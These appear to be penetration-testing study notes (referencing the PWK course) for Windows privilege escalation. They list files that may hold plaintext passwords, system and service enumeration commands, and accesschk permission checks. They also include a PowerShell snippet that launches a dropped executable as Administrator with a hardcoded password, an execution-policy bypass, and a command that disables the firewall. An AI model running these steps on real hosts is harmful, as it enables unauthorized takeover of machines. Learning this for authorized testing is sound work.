
###

Check if MS10-015 applies to host:
https://www.exploit-db.com/exploits/11199/

### Key Directories and Files

Check for the existance of these files, they often contain plain text passwords

```
c:\sysprep.inf
c:\sysprep\sysprep.xml
%WINDIR%\Panther\Unattend\Unattended.xml
%WINDIR%\Panther\Unattended.xml
```

#### What OS is the target running:
`systeminfo | findstr /B /C:"OS Name" /C:"OS Version"`

#### Hostname
`hostname`

`echo %hostname%`

#### List users on the local machine and query specific username
`net users`

`net user bob`


#### View Network Interfaces and Routing Table
`ipconfig /all`

`route print`

`arp -A`

#### Active Network Connections and Firewall Rules

`netstat -ano`

`netsh firewall show state`

`netsh firewall show config`

#### Running Processes and Scheduled Tasks

`schtasks /query /fo LIST /v`

`tasklist /SVC`

`net start`

`DRIVERQUERY`

`sc query type= service`

`sc qc <SERVICE NAME>`
  
  
`wmic useraccount where name='robert' get sid`


## Services Permissions

Write access (w)
surpress errors (u)
verbose (v)
Omit banner (q)
Specify name of service (c) - * indicates wildcard
Only process directories or top level keys (d)

`accesschk.exe -uwdqs Users c:\ /accepteula`

`accesschk.exe -uwcqv "Authenticated Users" * /accepteula`



## Powershell Exploit (Page 360 in PWK)

```
$secpasswd = ConvertTo-SecureString "sup3r53cr3tGP0pa55" -AsPlainText -Force
$mycreds = New-Object System.Management.Automation.PSCredential ("Administrator",
$secpasswd)
$computer = "DEV01"
[System.Diagnostics.Process]::Start("C:\Windows\temp\dabbb118.exe","",
$mycreds.Username, $mycreds.Password, $computer)
```

Run this:

> powershell -ExecutionPolicy Bypass -File c:\Windows\temp\run.ps1


### Other Useful Commands

> netsh firewall set opmode mode=DISABLE


### Check for AlwaysInstalledElevated 

```
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
```
